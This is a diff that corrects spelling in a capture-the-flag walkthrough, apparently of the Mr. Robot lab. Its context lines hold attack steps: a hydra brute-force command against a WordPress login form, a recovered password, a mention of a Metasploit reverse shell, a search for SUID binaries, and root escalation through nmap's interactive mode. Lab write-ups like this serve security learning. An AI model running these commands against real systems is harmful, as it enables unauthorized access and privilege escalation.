@@ -45,7 +45,7 @@ Let's download the dictionary file "fsocity.dic" and have a look:
 wget $IP/fsocity.dic
 ```
 
-The file seems to be a password list but there are a lot of redunant entries. If we want to use this to brute-force login to the word-press admin portal we should remove all duplicate entries. We can use ```uniq``` for this but uniq expects a sorted list so we run the following:
+The file seems to be a password list but there are a lot of redundant entries. If we want to use this to brute-force login to the word-press admin portal we should remove all duplicate entries. We can use ```uniq``` for this but uniq expects a sorted list so we run the following:
 
 ```sh
 sort fsocity.dic | uniq > uniqfsocity.dic
@@ -63,7 +63,7 @@ We find out the username "Elliot" is valid and abort hydra. Now let's use the sa
 hydra -l Elliot -P uniqfsocity.dic -t 64 $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect."
 ```
 
-This unfortunantly takes some time but after a while we get the correct password for Elliot: ER28-0652
+This unfortunately takes some time but after a while we get the correct password for Elliot: ER28-0652
 
 With access to the wordpress backend we can start Metasploit to exploit wordpress for a reverse shell:
 
@@ -210,7 +210,7 @@ find / -user root -perm -4000 2>/dev/null
 /usr/lib/pt_chown
 ```
 
-We can exploit nmap (/usr/local/bin/nmap) with a vulnerability in the interactive mode since nmap is running with root priviledges but we can trigger it as user robot:
+We can exploit nmap (/usr/local/bin/nmap) with a vulnerability in the interactive mode since nmap is running with root privileges but we can trigger it as user robot:
 
 ```sh
 nmap --interactive
